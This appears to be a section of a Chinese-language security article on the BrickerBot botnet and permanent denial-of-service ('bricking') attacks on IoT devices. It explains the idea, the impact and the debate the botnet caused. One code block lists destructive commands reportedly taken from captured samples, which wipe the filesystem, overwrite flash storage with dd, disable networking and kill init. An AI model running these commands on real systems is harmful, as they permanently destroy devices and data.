# BrickerBot破坏型僵尸网络

### 5.1 PDoS攻击概念

BrickerBot引入了一种全新的攻击范式——永久拒绝服务（Permanent Denial of Service, PDoS），又称"砖化"（Bricking）攻击：

```
传统DoS/DDoS vs PDoS对比:

传统DDoS:
  攻击者 → 发送流量 → 目标过载 → 服务暂时不可用 → 恢复

PDoS:
  攻击者 → 感染设备 → 破坏固件/文件系统 → 设备永久损坏 → 需要物理更换

BrickerBot声称目标:
- 砖化约200万台IoT设备
- 理由: "这些设备太不安全，不如让它们彻底坏掉"
- 实际效果: 大量设备变砖无法使用
```

### 5.2 BrickerBot破坏手法

```bash
# BrickerBot使用的破坏命令（从捕获样本中分析）

# 1. 破坏存储设备
rm -rf / /*
dd if=/dev/zero of=/dev/mtdblock0 bs=1024 count=1024
dd if=/dev/urandom of=/dev/mtdblock0 bs=1024 count=1024

# 2. 破坏网络配置
ifconfig eth0 down
ifconfig wlan0 down
route del default

# 3. 破坏启动配置
rm -f /etc/init.d/*
rm -f /etc/rc.d/*
echo "BRICKED" > /etc/issue

# 4. TCP SYN泛洪（使网络栈崩溃）
# 使用设备自身的资源进行自毁式攻击

# 5. 破坏进程管理
kill -9 1  # 尝试杀死init进程
killall -9
```

### 5.3 BrickerBot的影响

BrickerBot的攻击导致了：

- 大量廉价IoT摄像头和路由器永久损坏
- 设备制造商面临大量保修更换请求
- 消费者直接经济损失
- 安全社区关于"以破坏促安全"理念的激烈讨论

---

---

